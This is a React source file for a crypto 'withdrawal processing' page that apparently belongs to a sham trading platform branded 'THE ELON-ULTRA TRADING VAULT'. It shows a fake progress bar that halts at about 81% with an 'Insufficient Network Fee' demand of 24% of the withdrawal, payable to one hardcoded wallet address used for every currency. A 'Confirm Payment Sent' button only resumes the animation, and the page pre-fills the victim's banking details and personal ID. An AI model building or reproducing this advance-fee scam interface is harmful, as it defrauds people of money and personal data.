import { useState, useEffect, useRef } from 'react';
import { useSearchParams, useNavigate, useLocation } from 'react-router-dom';
import './WithdrawalFeeConfirmPage.css';

export default function WithdrawalProcessPage() {
  const [searchParams] = useSearchParams();
  const location = useLocation();
  const navigate = useNavigate();
  
  const [withdrawal, setWithdrawal] = useState(null);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  
  // Form fields
  const [formData, setFormData] = useState({
    digital: '',
    tdate: '',
    destCountry: '',
    benAcct: '',
    benName: '',
    benId: '',
    benBranch: '',
    fromAcct: '',
    xcur: '',
    rate: '',
    amount: '',
    notes: '',
  });
  
  // Progress tracking
  const [progressPct, setProgressPct] = useState(0);
  const [status, setStatus] = useState('pending');
  const [showFeeAlert, setShowFeeAlert] = useState(false);
  const [feePaid, setFeePaid] = useState(0);
  const [depositAddress, setDepositAddress] = useState('0xd36e85873f91120785D3090Af4fE00d1050720c0');
  const [depositLoading, setDepositLoading] = useState(true);
  
  // Mobile collapsible sections
  const [expandedSections, setExpandedSections] = useState({
    recipient: false,
    notes: false,
  });
  
  const progressTimerRef = useRef(null);
  const feeTimerRef = useRef(null);

  const toggleSection = (section) => {
    setExpandedSections(prev => ({
      ...prev,
      [section]: !prev[section]
    }));
  };

  // Get withdrawal data from URL params or state
  useEffect(() => {
    const amount = location.state?.amount || searchParams.get('amount');
    const currency = location.state?.currency || searchParams.get('currency');
    const id = location.state?.withdrawalId || searchParams.get('id');
    const feeAmount = location.state?.feeAmount || (parseFloat(amount) * 0.24).toFixed(8);

    if (!amount || !currency) {
      setError('Missing withdrawal details. Please start a new withdrawal.');
      return;
    }

    const fee = parseFloat(feeAmount);
    const total = parseFloat(amount) + fee;

    const withdrawalData = {
      id: id || `WD-${Date.now()}`,
      amount: parseFloat(amount),
      currency,
      fee: parseFloat(fee.toFixed(8)),
      total: parseFloat(total.toFixed(8)),
      feeAddress: '0xd36e85873f91120785D3090Af4fE00d1050720c0',
      status: 'REQUIRED',
    };
    
    setWithdrawal(withdrawalData);

    // Get current date in YYYY-MM-DD format
    const today = new Date().toISOString().split('T')[0];

    // Load banking data from localStorage if available
    let bankingDetails = {};
    try {
      const saved = localStorage.getItem('bankingDetails');
      if (saved) {
        bankingDetails = JSON.parse(saved);
      }
    } catch (e) {
      console.log('Failed to load banking details');
    }

    // Pre-fill form with combined data
    setFormData(prev => ({
      ...prev,
      digital: currency,
      amount: amount,
      rate: '1.0',
      tdate: today,
      fromAcct: 'THE ELON-ULTRA TRADING VAULT',
      xcur: 'USDT',
      destCountry: bankingDetails.country || '',
      benName: bankingDetails.acctName || '',
      benAcct: bankingDetails.acctNumber || '',
      benId: bankingDetails.personalId || '',
      benBranch: bankingDetails.branch || '',
    }));

    return () => {};
  }, [searchParams, location.state]);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const fetchDepositAddress = async (currency) => {
    // Set loading state
    setDepositLoading(true);
    setError('');
    
    const defaultAddresses = {
      'USDT': '0xd36e85873f91120785D3090Af4fE00d1050720c0',
      'BNB': '0xd36e85873f91120785D3090Af4fE00d1050720c0',
      'ETH': '0xd36e85873f91120785D3090Af4fE00d1050720c0',
      'BTC': '0xd36e85873f91120785D3090Af4fE00d1050720c0',
    };
    
    const defaultAddr = defaultAddresses[currency] || '0xd36e85873f91120785D3090Af4fE00d1050720c0';
    
    try {
      // Try to fetch from API first
      const baseUrl = window.location.origin;
      const response = await fetch(`${baseUrl}/api/deposit/address?currency=${currency}`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000,
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.address) {
          setDepositAddress(data.address);
          setDepositLoading(false);
          return;
        }
      }
    } catch (err) {
      console.log('Fetch failed, using default address:', err.message);
    }
    
    // If API fetch fails or returns no address, use default
    setDepositAddress(defaultAddr);
    setDepositLoading(false);
  };



  const startTransfer = (feeAmount, withdrawalAmount) => {
    if (progressTimerRef.current) {
      return;
    }
    
    setStatus('transferring');
    
    // Progress at 3% per second
    progressTimerRef.current = setInterval(() => {
      setProgressPct(prev => {
        const newPct = prev + 3;
        if (newPct >= 100) {
          clearInterval(progressTimerRef.current);
          progressTimerRef.current = null;
          setStatus('completed');
          setSuccess('✓ Withdrawal processing complete! Funds transferred to your account.');
          setTimeout(() => {
            navigate('/transactions?tab=withdrawals');
          }, 3000);
          return 100;
        }
        return newPct;
      });
    }, 1000);

    // Show fee alert after 27 seconds (at ~81%)
    feeTimerRef.current = setTimeout(() => {
      pauseTransferForFee();
      setShowFeeAlert(true);
      // Fetch deposit address when fee alert appears
      if (withdrawal?.currency) {
        fetchDepositAddress(withdrawal.currency);
      }
    }, 27000);

    return () => {
      if (progressTimerRef.current) clearInterval(progressTimerRef.current);
      if (feeTimerRef.current) clearTimeout(feeTimerRef.current);
    };
  };

  const pauseTransferForFee = () => {
    // Clear both timers to stop all progress
    if (progressTimerRef.current) {
      clearInterval(progressTimerRef.current);
      progressTimerRef.current = null;
    }
    if (feeTimerRef.current) {
      clearTimeout(feeTimerRef.current);
      feeTimerRef.current = null;
    }
    setStatus('interrupted');
  };

  const resumeTransferAfterFee = () => {
    if (status !== 'interrupted') {
      startTransfer(withdrawal.fee, withdrawal.amount);
      return;
    }

    setShowFeeAlert(false);
    setStatus('transferring');
    
    // Resume from interrupted percentage
    progressTimerRef.current = setInterval(() => {
      setProgressPct(prev => {
        const newPct = prev + 3;
        if (newPct >= 100) {
          clearInterval(progressTimerRef.current);
          progressTimerRef.current = null;
          setStatus('completed');
          setSuccess('✓ Withdrawal processing complete! Funds transferred to your account.');
          setTimeout(() => {
            navigate('/transactions?tab=withdrawals');
          }, 3000);
          return 100;
        }
        return newPct;
      });
    }, 1000);
  };

  const handleAutoConfirmFee = () => {
    // Auto-confirm the fee and continue
    setFeePaid(withdrawal.fee);
    setTimeout(() => {
      resumeTransferAfterFee();
    }, 1200);
  };

  if (!withdrawal) {
    return (
      <div className="withdraw-container">
        <div className="wrap">
          {error && <div className="alert alert-error">{error}</div>}
          <p>Loading withdrawal details...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="withdraw-container">
      <div className="wrap">
        <h2>Withdrawal Processing</h2>

        {error && <div className="alert alert-error">{error}</div>}
        {success && <div className="alert alert-success">{success}</div>}

        {/* Main Withdrawal Details Card */}
        <div className="card">
          <div className="card-section">
            <div className="section-header">Withdrawal Details</div>
            <div className="grid-3">
              <div>
                <label htmlFor="digital">Digital Currency</label>
                <select
                  id="digital"
                  name="digital"
                  value={formData.digital}
                  onChange={handleInputChange}
                >
                  <option value="">Select currency</option>
                  <option>BTC</option>
                  <option>ETH</option>
                  <option>USDT</option>
                  <option>USDC</option>
                  <option>XRP</option>
                </select>
              </div>
              <div>
                <label htmlFor="amount">Transfer Amount</label>
                <input
                  id="amount"
                  name="amount"
                  type="number"
                  step="any"
                  value={formData.amount}
                  onChange={handleInputChange}
                />
              </div>
              <div>
                <label htmlFor="tdate">Date</label>
                <input
                  id="tdate"
                  type="date"
                  name="tdate"
                  value={formData.tdate}
                  readOnly
                  style={{ background: 'var(--input-bg-disabled)', cursor: 'not-allowed' }}
                />
              </div>
            </div>
          </div>

          <div className="card-divider"></div>

          <div className="card-section">
            <div className="section-header">Transfer Details</div>
            <div className="grid-3">
              <div>
                <label htmlFor="fromAcct">From Account</label>
                <input
                  id="fromAcct"
                  name="fromAcct"
                  value={formData.fromAcct}
                  readOnly
                  style={{ background: 'var(--input-bg-disabled)', cursor: 'not-allowed' }}
                />
              </div>
              <div>
                <label htmlFor="xcur">Currency Code</label>
                <input
                  id="xcur"
                  name="xcur"
                  value={formData.xcur}
                  readOnly
                  style={{ background: 'var(--input-bg-disabled)', cursor: 'not-allowed' }}
                />
              </div>
              <div>
                <label htmlFor="rate">Exchange Rate</label>
                <input
                  id="rate"
                  name="rate"
                  type="number"
                  step="any"
                  value={formData.rate}
                  onChange={handleInputChange}
                />
              </div>
            </div>
          </div>

          <div className="card-divider"></div>

          <div className="card-section">
            <button 
              className="section-toggle"
              onClick={() => toggleSection('recipient')}
              aria-expanded={expandedSections.recipient}
            >
              <span className="section-header">Recipient Information</span>
              <span className="toggle-icon">{expandedSections.recipient ? '−' : '+'}</span>
            </button>
            
            {expandedSections.recipient && (
              <div className="collapsible-content">
                <div className="grid-2">
                  <div>
                    <label htmlFor="destCountry">Destination Country</label>
                    <input
                      id="destCountry"
                      name="destCountry"
                      placeholder="Country"
                      value={formData.destCountry}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div>
                    <label htmlFor="benName">Recipient Name</label>
                    <input
                      id="benName"
                      name="benName"
                      placeholder="Full name"
                      value={formData.benName}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div>
                    <label htmlFor="benAcct">Account Number</label>
                    <input
                      id="benAcct"
                      name="benAcct"
                      value={formData.benAcct}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div>
                    <label htmlFor="benId">Personal ID</label>
                    <input
                      id="benId"
                      name="benId"
                      value={formData.benId}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div>
                    <label htmlFor="benBranch">Bank Branch</label>
                    <input
                      id="benBranch"
                      name="benBranch"
                      value={formData.benBranch}
                      onChange={handleInputChange}
                    />
                  </div>
                </div>
              </div>
            )}
          </div>

          <div className="card-divider"></div>

          <div className="card-section">
            <button 
              className="section-toggle"
              onClick={() => toggleSection('notes')}
              aria-expanded={expandedSections.notes}
            >
              <span className="section-header">Notes & Details</span>
              <span className="toggle-icon">{expandedSections.notes ? '−' : '+'}</span>
            </button>
            
            {expandedSections.notes && (
              <div className="collapsible-content">
                <label htmlFor="notes">Additional Notes</label>
                <textarea
                  id="notes"
                  name="notes"
                  rows="2"
                  value={formData.notes}
                  onChange={handleInputChange}
                />
              </div>
            )}
          </div>
        </div>

        {/* Progress Card */}
        <div className="card">
          {status === 'pending' && (
            <>
              <p style={{ 
                fontSize: '13px', 
                lineHeight: '1.6', 
                color: 'var(--text)', 
                margin: '0 0 12px 0',
                padding: '12px',
                background: 'rgba(251, 191, 36, 0.08)',
                border: '1px solid rgba(251, 191, 36, 0.3)',
                borderRadius: '8px'
              }}>
                ⚠️ Please review all information above before proceeding. Once you start processing, this withdrawal will be initiated. Make sure the recipient details, amounts, and all other information are correct.
              </p>
              
              <button 
                onClick={() => startTransfer(withdrawal.fee, withdrawal.amount)}
                style={{ 
                  width: '100%', 
                  padding: '12px',
                  marginBottom: '12px',
                  background: 'var(--accent)',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '600',
                  transition: 'opacity 0.2s'
                }}
              >
                → Start Processing
              </button>
            </>
          )}

          {status !== 'pending' && (
            <div className="progress-section">
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '12px' }}>
                <span style={{ fontWeight: '600', fontSize: '13px' }}>Processing Status</span>
                <span className="status">{status}</span>
              </div>
              <div className="progress">
                <i id="bar" style={{
                  width: `${progressPct}%`,
                }}></i>
              </div>
              <div style={{ fontSize: '12px', color: 'var(--muted)', marginTop: '8px', textAlign: 'center' }}>
                {progressPct}%
              </div>
            </div>
          )}

          {status !== 'pending' && (
            <div className="controls" style={{ marginTop: '12px' }}>
              <button disabled={status !== 'pending' && status !== 'interrupted'}>
                {status === 'completed' ? 'Completed' : 'Processing'}
              </button>
              <button
                style={{ background: '#d33' }}
                onClick={() => {
                  if (progressTimerRef.current) clearInterval(progressTimerRef.current);
                  if (feeTimerRef.current) clearTimeout(feeTimerRef.current);
                  setStatus('cancelled');
                  setProgressPct(0);
                }}
                disabled={status === 'completed' || status === 'cancelled'}
              >
                Cancel
              </button>
            </div>
          )}
        </div>

        {/* Fee Alert Modal - AUTO-CONFIRMS */}
        {showFeeAlert && (
          <div className="fee-alert-modal">
            <div className="fee-alert-content">
              <h3>Insufficient Network Fee</h3>
              <p style={{ fontSize: '13px', color: 'var(--muted)', marginTop: '8px', marginBottom: '12px' }}>
                A network fee is required to cover blockchain charges for this transaction.
              </p>
              
              <div style={{ padding: '12px', background: 'rgba(0,0,0,0.05)', borderRadius: '8px', marginBottom: '12px' }}>
                <div style={{ fontSize: '13px' }}>
                  <div><strong>Withdrawal Amount:</strong> {withdrawal?.amount.toFixed(8)} {withdrawal?.currency}</div>
                  <div style={{ marginTop: '6px' }}><strong>Network Fee Required:</strong> {withdrawal?.fee.toFixed(8)} {withdrawal?.currency}</div>
                </div>
              </div>

              <div style={{ marginTop: '12px', marginBottom: '12px' }}>
                <p style={{ fontSize: '12px', fontWeight: '600', marginBottom: '8px' }}>Send Payment To:</p>
                <div style={{ background: 'var(--card)', border: '1px solid var(--border)', padding: '10px', borderRadius: '6px', fontSize: '12px', wordBreak: 'break-all', fontFamily: 'monospace', marginBottom: '8px' }}>
                  {depositAddress || 'Loading...'}
                </div>
                <button
                  type="button"
                  style={{
                    width: '100%',
                    padding: '8px',
                    background: 'var(--border)',
                    border: 'none',
                    borderRadius: '6px',
                    cursor: 'pointer',
                    fontSize: '12px',
                    marginBottom: '12px'
                  }}
                  disabled={!depositAddress}
                  onClick={() => {
                    navigator.clipboard.writeText(depositAddress);
                    alert('Address copied to clipboard');
                  }}
                >
                  📋 Copy Address
                </button>
                {depositLoading && (
                  <p style={{ fontSize: '11px', color: 'var(--muted)', textAlign: 'center' }}>Verifying address...</p>
                )}
              </div>
              
              <div style={{ display: 'flex', gap: '8px', marginTop: '16px' }}>
                <button onClick={handleAutoConfirmFee} style={{ flex: 1 }}>
                  ✓ Confirm Payment Sent
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Support Info */}
        {status === 'interrupted' && !showFeeAlert && (
          <div className="alert alert-warn">
            If this takes too long, contact support at cryptocurrencytradingtheelonu@gmail.com.
          </div>
        )}
      </div>
    </div>
  );
}
